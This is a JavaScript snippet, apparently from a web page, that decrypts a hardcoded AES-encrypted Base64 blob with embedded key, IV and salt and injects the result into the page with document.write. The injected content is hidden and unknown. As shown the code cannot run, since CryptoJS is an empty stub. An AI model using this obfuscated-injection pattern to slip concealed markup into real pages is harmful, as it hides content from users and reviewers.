(function (root) {
  const CryptoJS = {}
  function KissEnc () {}
  KissEnc.prototype.decrypt = function (encrypted) {
    try {
      const k = CryptoJS.enc.Hex.parse('a5e8d2e9c1721ae0e84ad660c472c1f3')
      const g = CryptoJS.enc.Utf8.parse('WrxLl3rnA48iafgCy')
      const h = CryptoJS.enc.Utf8.parse('CartKS$2141#')
      const l = CryptoJS.PBKDF2(g.toString(CryptoJS.enc.Utf8), h, {
        keySize: 4,
        iterations: 1e3
      })
      const j = CryptoJS.lib.CipherParams.create({
        ciphertext: CryptoJS.enc.Base64.parse(encrypted)
      })
      const i = CryptoJS.AES.decrypt(j, l, {
        mode: CryptoJS.mode.CBC,
        iv: k,
        padding: CryptoJS.pad.Pkcs7
      })
      return i.toString(CryptoJS.enc.Utf8)
    } catch (S) {
      return ''
    }
  }
  root.$KissEnc = new KissEnc()
})(window)

document.write(window.$KissEnc.decrypt("+pxRTnB0FFm9YrEmGgoQTGNcZjKWVYNK1hu5LyV/JXdZYYYVD1IdOzY34R+9HzmWSKdQFn2B8lG0z7edPoOirm/cA8DemSxj+Tbngm0BFK8ZM/9tGwHN2APIv8JDauzXq39bGZHfFCn9LxZRslRdwXBg7o9wRA6ekYlP5SOqo6d9O9kDjbhgLvE7XLzaFPAnGB5LYX+TLjezpR2prfr4v8dCToT0Vu2glJDjyqQjh/HJDS09ecNN2dYJEUnPOZ2OmKxOx8EErdyZYiaQRNcV2GSihusD4NShbBeLvqKpPk4oxyqKkKFYM8s+r0SgPsMiwVMPipRJK9jXD3dKWdEVf62ipE1EN+y7Su7ReIyHuUPJwXTtqdonnTXIAlQmKVbz9W4AFpP3G1IxryrjSi1jGACOKDcSvrTWuFSXuGo6Umb6T66MwmDQLVbSUZB1PhYfgIwnh2qW2fNhMPxPYmg2T26qATcO/HvblHuAjy27Go6Xc5ISu83HpNf6ei7NCCDoIlJRP55Fw+P4UWu+G5AJSJ/4GRDPh+6Nife7bl55A8UPtY/xF3rkNeXejEAyHy7G"))
